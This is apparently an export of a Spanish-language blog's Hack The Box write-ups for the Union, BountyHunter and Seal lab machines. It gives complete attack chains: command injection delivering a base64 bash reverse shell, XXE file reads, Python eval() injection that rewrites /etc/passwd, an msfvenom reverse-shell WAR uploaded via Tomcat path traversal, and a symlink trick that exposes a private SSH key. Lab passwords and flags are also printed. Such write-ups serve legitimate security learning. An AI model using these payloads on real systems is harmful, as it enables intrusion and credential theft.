\u0026lt;h3class=\"text-white\"\u0026gt;Your IP Address has now been granted SSH Access.\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt;  Se ve que está utilizando un comando a nivel de sistema con sudo. El usuario que ejecuta el servidor es www-data, por lo que este usuario tiene permisos de sudo.\nEsta misma línea de código es vulnerable a inyección de comandos, ya que la variable $ip está siendo contatenada al comando de sistema. Podemos conseguir control sobre la variable si incluimos una cabecera HTTP llamada X-Forwarded-For.\nLa explotación de la vulnerabilidad se puede realizar utilizando un ;, añadiendo el comando y después poniendo otro , o un comentario (#). Yendo al grano, podemos introducir un comando codificado en Base64 para enviarnos una reverse shell:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Hay que tener en cuenta que necesitamos tener una cookie válida para indicar al servidor que estamos autenticados:\n$ curl 10.10.11.128/firewall.php -H 'X-Forwarded-For: ; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash #' -H 'Cookie: PHPSESSID=57ti1m6fcai85k3mddqamripr0'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.128. Ncat: Connection from 10.10.11.128:33092. bash: cannot set terminal process group (801): Inappropriate ioctl for device bash: no job control in this shell www-data@union:~/html$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@union:~/html$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@union:~/html$ export TERM=xterm www-data@union:~/html$ export SHELL=bash www-data@union:~/html$ stty rows 50 columns 158  Escalada de privilegios Como se muestra a continuación, el usuario www-data es capaz de ejecutar cualquier comando como root usando sudo sin proporcionar contraseña:\nwww-data@union:~/html$ sudo -l Matching Defaults entries for www-data on union: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on union: (ALL : ALL) NOPASSWD: ALL  Entonces, la escalada de privilegios es sencilla:\nwww-data@union:~/html$ sudo su root@union:~# cat /root/root.txt b044d40cc077970a99f680d1e82211b6  ","image":"/images/HTB/Union/Union.png","permalink":"https://7rocky.github.io/htb/union/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina contiene vulnerabilidades de inyección de código SQL (SQLi) e inyección de comandos. Para comprometer la máquina se necesitan algunas técnicas de evasión de SQLi y análisis de código fuente. En este write-up se utiliza un programa en Java personalizado para automatizar un ataque de SQLi","time":5,"title":"Union"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.100   Fecha: 24 / 07 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.100 -p 22,80 Nmap scan report for 10.10.11.100 Host is up (0.036s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 8.17 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración Si accedemos a la página web en el puerto 80, veremos algo como lo siguiente:\nSi vamos a \u0026ldquo;PORTAL\u0026rdquo;, nos lleva a la siguiente página\nY pinchando en \u0026ldquo;here\u0026rdquo;, vamos a un portal de desarrollo para generar una especie de reporte para bug bounty:\nSi rellenamos el formulario y lo enviamos, el servidor responde con los mismos datos y los imprime en la página:\nPodemos hacer uso de gobuster para buscar rutas del servidor:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q /resources (Status: 301) [Size: 316] [--\u0026gt; http://10.10.11.100/resources/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.100/assets/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.100/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.100/js/] /server-status (Status: 403) [Size: 276]  Encontramos que hay archivos interesantes en la ruta /resources (existe una vulnerabilidad de listado de directorios):\nAquí podemos leer algunas tareas del desarrollador, pero nada interesante de momento:\nSin embargo, hay un archivo interesante de JavaScript llamado bountylog.js:\n$ curl http://10.10.11.100/resources/bountylog.js  functionreturnSecret(data) { returnPromise.resolve( $.ajax({ type: \"POST\", data: { \"data\": data}, url: \"tracker_diRbPr00f314.php\" }) ); } asyncfunctionbountySubmit() { try{ varxml=`\u0026lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;${$('#exploitTitle').val()}\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;${$('#cwe').val()}\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;${$('#cvss').val()}\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;${$('#reward').val()}\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt;` letdata=awaitreturnSecret(btoa(xml)); $(\"#return\").html(data) } catch(error) { console.log('Error:', error); } }  Estas funciones se ejecutan al enviar el formulario de antes. Se están enviando los datos como documento XML a tracker_diRbPr00f314.php. Esto nos dice claramente que el vector de ataque es inyectar una Entidad Externa XML (XXE).\nAcceso a la máquina Si el servidor es vulnerable a XXE, entonces podemos leer archivos del servidor si conocemos la ruta completa del archivo en cuestión.\nExplotando un XXE Para explotar el XXE, se utiliza un script en Bash llamado xxe.sh que automatiza el proceso y extrae el contenido deseado (explicación detallada aquí). La idea es leer archivos del servidor de la siguiente manera:\n$ bash xxe.sh /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  Para leer el contenido de los archivos PHP, podemos utilizar un wrapper para codificarlo en Base64 y decodificarlo después. Así, evitamos que aparezcan caracteres especiales de XML (como \u0026lt; y \u0026gt;).\nPodemos probar algunas listas para explotar el LFI, pero ninguna es útil. Parace que tiene que haber información sensible en el código PHP, pero no hay nada interesante en los archivos que conocemos del servidor (index.php, portal.php, log_submit.php y tracker_diRbPr00f314.php, todos accesibles desde /var/www/html).\nEncontrando una contraseña En este punto, podemos recordar que había tareas en el archivo README.txt relacionadas con una base de datos. Después de algunas pruebas, se descubre que el archivo db.php existe en el servidor.\nSi no fuéramos capaces de adivinar el nombre del archivo, podemos probar muchas opciones con un bucle en Bash:\n$ for f in $(cat $WORDLISTS/dirbuster/directory-list-2.3-medium.txt); do bash xxe.sh /var/www/html/$f.php | grep -v 'Nothing found' \u0026/dev/null \u0026\u0026 echo Found: /var/www/html/$f.php; done Found: /var/www/html/index.php Found: /var/www/html/portal.php Found: /var/www/html/db.php  Y otra manera sería volver al comando de gobuster y añadirle extensión PHP:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q -x php /index.php (Status: 200) [Size: 25169] /resources (Status: 301) [Size: 316] [--\u0026gt; http://10.10.11.100/resources/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.100/assets/] /portal.php (Status: 200) [Size: 125] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.100/css/] /db.php (Status: 200) [Size: 0] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.100/js/] /server-status (Status: 403) [Size: 276]  Si utilizamos el script de Bash para leer el archivo db.php, obtenemos una contraseña:\n$ bash xxe.sh /var/www/html/db.php  \u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver =\"localhost\"; $dbname =\"bounty\"; $dbusername =\"admin\"; $dbpassword =\"m19RoAU0hP41A1sTsq6K\"; $testuser =\"test\"; ?\u0026gt;  Esta contraseña se reutiliza para acceder por SSH como usuario development. Sabemos que existe este usuario porque aparece listado en /etc/passwd:\n$ bash xxe.sh /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash development:x:1000:1000:Development:/home/development:/bin/bash  Y ahora podemos conseguir la flag user.txt:\n$ ssh development@10.10.11.100 development@10.10.11.100's password: development@bountyhunter:~$ cat user.txt 40b17284532347c9d5a94488e640f2b3  Enumeración del sistema El usuario development puede ejecutar un script de Python como root con sudo:\ndevelopment@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py  Existe un archivo llamado contract.txt en su directorio personal. Este archivo da un poco de contexto y aporta razones para tener sudo habilitado para ejecutar el script de Python:\ndevelopment@bountyhunter:~$ ls -a . .bash_history .bashrc contract.txt .local .ssh .viminfo .. .bash_logout .cache .lesshst .profile user.txt development@bountyhunter:~$ cat contract.txt Hey team, I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed. This has been our first job since the \"rm -rf\" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why. I set up the permissions for you to test this. Good luck. -- John  El script de Python es el siguiente:\n#Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. defload_file(loc): ifloc.endswith(\".md\"): returnopen(loc, 'r') else: print(\"Wrong file type.\") exit() defevaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line=None fori, xinenumerate(ticketFile.readlines()): ifi==0: ifnotx.startswith(\"# Skytrain Inc\"): returnFalse continue ifi==1: ifnotx.startswith(\"## Ticket to \"): returnFalse print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue ifx.startswith(\"__Ticket Code:__\"): code_line=i+1 continue ifcode_lineandi==code_line: ifnotx.startswith(\"**\"): returnFalse ticketCode=x.replace(\"**\", \"\").split(\"+\")[0] ifint(ticketCode) %7==4: validationNumber=eval(x.replace(\"**\", \"\")) ifvalidationNumber\u0026gt;100: returnTrue else: returnFalse returnFalse defmain(): fileName=input(\"Please enter the path to the ticket file.\\n\") ticket=load_file(fileName) #DEBUG print(ticket) result=evaluate(ticket) if(result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.close main()  Escalada de privilegios Hay un code smell en este script, que es el uso de la función eval(), la cual es una funcion insegura y no se recomienda utilizar. Con esta función, podemos conseguir ejecución de código arbitrario como root (porque tenemos permisos con sudo) mediante una inyección de comandos en lenguaje Python.\nEn esta situación, hay muchas alternativas para ganar acceso como root. Esta vez, modificaremos la contraseña de root en el archivo /etc/passwd. Por ejemplo, podemos utilizar la siguiente contraseña y encriptarla con openssl (formato DES Unix):\n$ openssl passwd rocky JyHhfPjiAYUB2  Podemos hacer uso de la función open() de Python para leer archivos y escribir en ellos como root. La idea es meter la contraseña en /etc/passwd para el usuario root, como sigue:\n- root:x:0:0:root:/root:/bin/bash + root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash  Mirando el código, el programa está leyendo un archivo MarkDown (ticket) y haciendo una serie de validaciones. La primera es:\nfori, xinenumerate(ticketFile.readlines()): ifi==0: ifnotx.startswith(\"# Skytrain Inc\"): returnFalse continue  Entonces, la primera línea del archivo tiene que ser # Skytrain Inc. Y aquí hay otra validación:\nifi==1: ifnotx.startswith(\"## Ticket to \"): returnFalse print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue  El programa espera una segunda línea específica, por lo que el archivo tiene que tener ## Ticket to  como segunda línea.\nY después, para poder introducir código de Python, necesitamos otra línea, porque hay otra validación más:\nifx.startswith(\"__Ticket Code:__\"): code_line=i+1 continue ifcode_lineandi==code_line: ifnotx.startswith(\"**\"): returnFalse ticketCode=x.replace(\"**\", \"\").split(\"+\")[0] ifint(ticketCode) %7==4: validationNumber=eval(x.replace(\"**\", \"\")) ifvalidationNumber\u0026gt;100: returnTrue else: returnFalse returnFalse  Como se puede ver, otra línea que hay que poner es __Ticket Code:__.\nY finalmente, la variable ticketCode tiene que ser un número que tenga resto 4 al ser dividido entre 7 (por ejemplo: 4, 11, 18 o -3). Este ticketCode tiene que continuar con un signo + y después el código que irá directo a la función eval().\nAhora tenemos que crear el archivo ticket.md válido para ejecutar el código con la función eval(). Una opción posible es:\n# Skytrain Inc ## Ticket to 7Rocky __Ticket Code:__ **4+open('/etc/passwd', 'w').write('root:JyHhfPjiAYUB2' + open('/tmp/passwd').read()[6:])**  El código de Python inyectado es:\nopen('/etc/passwd', 'w').write('root:JyHhfPjiAYUB2'+open('/tmp/passwd').read()[6:])  Para que funcione, tenemos que guardar una copia de /etc/passwd en /tmp/passwd. El uso de [6:] es para obtener todo el contenido de /tmp/passwd a excepción de los 6 primeros caracteres, que corresponden exactamente a root:x.\ndevelopment@bountyhunter:~$ cp /etc/passwd /tmp/passwd development@bountyhunter:~$ head -1 /tmp/passwd root:x:0:0:root:/root:/bin/bash development@bountyhunter:~$ head -1 /etc/passwd root:x:0:0:root:/root:/bin/bash  Ahora ejecutamos el script y especificamos el archivo ticket.md donde está guardado. Como se puede ver, la contraseña de root ha cambiado:\ndevelopment@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. ticket.md Destination: 7Rocky Valid ticket. development@bountyhunter:~$ head -1 /etc/passwd root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash  Y ahora podemos acceder como root porque tenemos la contraseña:\ndevelopment@bountyhunter:~$ su root Password: root@bountyhunter:/home/development# cat /root/root.txt 5d5a6aae768dd80352e1cefa556aac3f  ","image":"/images/HTB/BountyHunter/BountyHunter.png","permalink":"https://7rocky.github.io/htb/bountyhunter/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyeccción de entidades externas XML (XXE) además de permisios de sudo configurados. Para comprometer la máquina se necesitan conocimientos sobre XXE, PHP y Python. En este write-up se utiliza un script en Bash para leer archivos del servidor explotando el XXE","time":6,"title":"BountyHunter"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.10.250   Fecha: 10 / 07 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.250 -p 22,443,8080 Nmap scan report for 10.10.10.250 Host is up (0.032s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) |_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Seal Market | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK | Not valid before: 2021-05-05T10:24:03 |_Not valid after: 2022-05-05T10:24:03 | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized | Date: Sun, 11 Jul 2021 20:12:53 GMT | Set-Cookie: JSESSIONID=node06lh8n576egh211y0xv2rr2r3i2.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 ... | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8). ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 17.11 seconds La máquina tiene abiertos los puertos 22 (SSH), 443 (HTTPS) y 8080 (HTTP).\nExplorando un repositorio Git en GitBucket La máquina tiene un servicio GitBucket en el puerto 8080:\nPara entrar, podemos crearnos una cuenta. Después, iniciamos sesión y vemos que hay dos repositorios: root/seal_market y root/infra:\nPodemos ver algunas pistas en el archivo README.md de root/seal_market acerca de la configuración de Tomcat:\nAdemás, existen algunos problemas en el mismo repositorio sobre autenticación mutua entre nginx y Tomcat:\nEs bien sabido que Tomcat gestiona la autenticación y autorización de usuarios mediante el archivo tomcat-users.xml (que es parte de la confuguración de Tomcat). Este archivo se encuentra en el repositorio, pero la versión actual no contiene información sensible (a lo mejor se ha actualizado porque había una tarea relacionada en el README.md):\nSin embargo, hay un commit anterior que contiene una contraseña. Esto se puede ver desde el botón \u0026ldquo;History\u0026rdquo;:\nTambién se puede ver utilizando el interfaz de línea de comandos de git. Para ello, tenemos que clonar el repositorio utilizando la cuenta registrada anteriormente:\n$ git clone http://10.10.10.250:8080/git/root/seal_market.git Después, utilizando git log podemos ver todos los commits relacionados al archivo tomcat-users.xml. Y utilizando un poco de shell scripting podemos filtrar la contraseña:\n$ git log -p tomcat/tomcat-users.xml | grep manager | grep password -\u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;42MrHBf*z8{Z%\u0026#34; roles=\u0026#34;manager-gui,admin-gui\u0026#34;/\u0026gt; +\u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;42MrHBf*z8{Z%\u0026#34; roles=\u0026#34;manager-gui,admin-gui\u0026#34;/\u0026gt; Esta contraseña curiosamente funciona parar iniciar sesión como luis en GitBucket, pero no hay nada más que hacer ahí.\nEncontrando malas configuraciones en los servidores web En el puerto 443 podemos ver una página web como esta:\nSi ocasionamos un error 404 Not Found, podemos ver que el servidor está corriendo Apache Tomcat/9.0.31:\nExisten unas configuraciones raras en los servidores, porque están utilizando Tomcat y nginx al mismo tiempo. El servidor nginx fue reportado por nmap, y también había alguna pista en GitBucket. Lo mismo para Tomcat.\nEsto puede ocasionar problemas ya que nginx normaliza las rutas de tipo /../ a /, pero no cambia rutas del tipo /..;/. Sin embargo, Tomcat convierte /..;/ en /../, haciendo posible un ataque de navegación de directorios (más información aquí):\nCon esta vulnerabilidad y la contraseña encontrada en GitBucket, podemos entrar en /manager/html desde /manager/status/..;/html y acceder al panel de administración.\nAcceso a la máquina En este momento, somos capaces de subir un archivo WAR malicioso en /manager/status/..;/html, utilizando msfvenom:\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f war -o reverse.war Payload size: 1091 bytes Final size of war file: 1091 bytes Saved as: reverse.war No obstante, al hacer la petición POST, se tiene que realizar modificando la URL a /manager/status/..;/html/uploads (porque no tenemos permisos para acceder directamente a /manager/html/uploads) como se muestra en Burp Suite:\nUtilizando Burp Suite, podemos cambiar laa URL antes de enviar la petición:\nPodemos verificar que el WAR se ha subido correctamente entrando de nuevo en /manager/status/..;/html:\nDespués, con nc obtenemos acceso a la máquina como usuario tomcat al cargar la página /reverse desde el panel de administrador de Tomcat:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.250. Ncat: Connection from 10.10.10.250:48774. script /dev/null -c bash Script started, file is /dev/null tomcat@seal:/var/lib/tomcat9$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm tomcat@seal:/var/lib/tomcat9$ export TERM=xterm tomcat@seal:/var/lib/tomcat9$ export SHELL=bash tomcat@seal:/var/lib/tomcat9$ stty rows 50 columns 158 Movimiento lateral al usuario luis Podemos ver que existe un usuario llamado luis leyendo el archivo /etc/passwd:\ntomcat@seal:/var/lib/tomcat9$ grep \u0026#39;sh$\u0026#39; /etc/passwd root:x:0:0:root:/root:/bin/bash luis:x:1000:1000:,,,:/home/luis:/bin/bash tomcat@seal:/var/lib/tomcat9$ ls -la /home/luis total 51324 drwxr-xr-x 9 luis luis 4096 Oct 25 19:51 . drwxr-xr-x 3 root root 4096 May 5 12:52 .. drwxrwxr-x 3 luis luis 4096 May 7 06:00 .ansible lrwxrwxrwx 1 luis luis 9 May 5 12:57 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 luis luis 220 May 5 12:52 .bash_logout -rw-r--r-- 1 luis luis 3797 May 5 12:52 .bashrc drwxr-xr-x 3 luis luis 4096 May 7 07:00 .cache drwxrwxr-x 3 luis luis 4096 May 5 13:45 .config drwxrwxr-x 6 luis luis 4096 Oct 25 19:19 .gitbucket -rw-r--r-- 1 luis luis 52497951 Jan 14 2021 gitbucket.war drwxrwxr-x 3 luis luis 4096 May 5 13:41 .java drwxrwxr-x 3 luis luis 4096 May 5 14:33 .local -rw-r--r-- 1 luis luis 807 May 5 12:52 .profile drwx------ 2 luis luis 4096 May 7 06:10 .ssh -r-------- 1 luis luis 33 Oct 25 19:19 user.txt Buscando archivos pertenecientes al usuario luis, se ve que hay un Ansible Playbook para hacer una copia de seguridad de la aplicación de Tomcat, que se guardará periódicamente en /opt/backups/archives:\ntomcat@seal:/var/lib/tomcat9$ find / -user luis 2\u0026gt;/dev/null | grep -vE \u0026#39;proc|/\\.\u0026#39; /opt/backups /opt/backups/archives /opt/backups/archives/backup-2021-07-15-15:50:33.gz /opt/backups/archives/backup-2021-07-15-15:53:32.gz /opt/backups/archives/backup-2021-07-15-15:52:32.gz /opt/backups/archives/backup-2021-07-15-15:51:32.gz /opt/backups/playbook /opt/backups/playbook/run.yml /home/luis /home/luis/user.txt /home/luis/gitbucket.war tomcat@seal:/var/lib/tomcat9$ cat /opt/backups/playbook/run.yml - hosts: localhost  tasks:  - name: Copy Files  synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes   - name: Server Backups  archive:  path: /opt/backups/files/  dest: \u0026#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\u0026#34;  - name: Clean  file:  state: absent  path: /opt/backups/files/ Explorando el directorio del cual se realiza la copia de seguridad, veos que tenemos todos los permisos en el directorio uploads:\ntomcat@seal:/var/lib/tomcat9$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard total 100 drwxr-xr-x 7 root root 4096 May 7 09:26 . drwxr-xr-x 3 root root 4096 May 6 10:48 .. drwxr-xr-x 5 root root 4096 Mar 7 2015 bootstrap drwxr-xr-x 2 root root 4096 Mar 7 2015 css drwxr-xr-x 4 root root 4096 Mar 7 2015 images -rw-r--r-- 1 root root 71744 May 6 10:42 index.html drwxr-xr-x 4 root root 4096 Mar 7 2015 scripts drwxrwxrwx 2 root root 4096 May 7 09:26 uploads tomcat@seal:/var/lib/tomcat9$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads total 8 drwxrwxrwx 2 root root 4096 May 7 09:26 . drwxr-xr-x 7 root root 4096 May 7 09:26 .. Para explotar esto, podemos crear un enlace simbólico al archivo id_rsa de luis en el directorio uploads, de manera que al realizar se realice una copia de seguridad con el archivo dentro. Entonces, podremos descomprimir la copia de seguridad y leer su contenido.\nPor tanto, primero creamos el enlace simbólico:\ntomcat@seal:/var/lib/tomcat9$ ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/ tomcat@seal:/var/lib/tomcat9$ ls -la webapps/ROOT/admin/dashboard/uploads/ total 8 drwxrwxrwx 2 root root 4096 Oct 25 20:00 . drwxr-xr-x 7 root root 4096 May 7 09:26 .. lrwxrwxrwx 1 tomcat tomcat 22 Oct 25 20:00 id_rsa -\u0026gt; /home/luis/.ssh/id_rsa Luego vemos que la copia de seguridad se crea, y podemos copiarla en /tmp para descomprimirla ahí:\ntomcat@seal:/var/lib/tomcat9$ cd /tmp tomcat@seal:/tmp$ ls -la /opt/backups/archives/ total 604 drwxrwxr-x 2 luis luis 4096 Jul 15 16:05 . drwxr-xr-x 4 luis luis 4096 Jul 15 16:05 .. -rw-rw-r-- 1 luis luis 608921 Jul 15 16:05 backup-2021-07-15-16:05:32.gz tomcat@seal:/tmp$ cp /opt/backups/archives/backup-2021-07-15-16:05:32.gz /tmp/backup.tar.gz tomcat@seal:/tmp$ tar -xf backup.tar.gz Y con este proceso, hemos conseguido explotar la mala configuración de permisos y obtener la clave privada de SSH (id_rsa) del usuario luis With this process, we have exploited the permissions misconfiguration and obtained the id_rsa of user luis:\ntomcat@seal:/tmp$ ls -la total 1208 drwxrwxrwt 4 root root 4096 Jul 15 16:06 . drwxr-xr-x 20 root root 4096 May 7 09:26 .. -rw-r----- 1 tomcat tomcat 608921 Jul 15 16:06 backup.tar.gz drwxr-x--- 7 tomcat tomcat 4096 May 7 09:26 dashboard drwxr-x--- 2 tomcat tomcat 4096 Jul 15 15:34 hsperfdata_tomcat tomcat@seal:/tmp$ ls -la dashboard/uploads/ total 12 drwxr-x--- 2 tomcat tomcat 4096 Jul 15 16:06 . drwxr-x--- 7 tomcat tomcat 4096 May 7 09:26 .. -rw------- 1 tomcat tomcat 2590 May 7 06:10 id_rsa tomcat@seal:/tmp$ cat dashboard/uploads/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG DkID79g/4XrnoKXm2ud0gmZxdVJUAQ33Kg3Nk6czDI0wevr/YfBpCkXm5rsnfo5zjEuVGo MTJhNZ8iOu7sCDZZA6sX48OFtuF6zuUgFqzHrdHrR4+YFawgP8OgJ9NWkapmmtkkxcEbF4 n1+v/l+74kEmti7jTiTSQgPr/ToTdvQtw12+YafVtEkB/8ipEnAIoD/B6JOOd4pPTNgX8R MPWH93mStrqblnMOWJto9YpLxhM43v9I6EUje8gp/EcSrvHDBezEEMzZS+IbcP+hnw5ela duLmtdTSMPTCWkpI9hXHNU9njcD+TRR/A90VHqdqLlaJkgC9zpRXB2096DVxFYdOLcjgeN 3rcnCAEhQ75VsEHXE/NHgO8zjD2o3cnAOzsMyQrqNXtPa+qHjVDch/T1TjSlCWxAFHy/OI PxBupE/kbEoy1+dJHuR+gEp6yMlfqFyEVhUbDqyhAAAFgOAxrtXgMa7VAAAAB3NzaC1yc2 EAAAGBALN5CEgnnXSmnAkIVXKU01XC8TPatokCs4vYbJ5RLdGe5HIWa0mbBg5CA+/YP+F6 56Cl5trndIJmcXVSVAEN9yoNzZOnMwyNMHr6/2HwaQpF5ua7J36Oc4xLlRqDEyYTWfIjru 7Ag2WQOrF+PDhbbhes7lIBasx63R60ePmBWsID/DoCfTVpGqZprZJMXBGxeJ9fr/5fu+JB 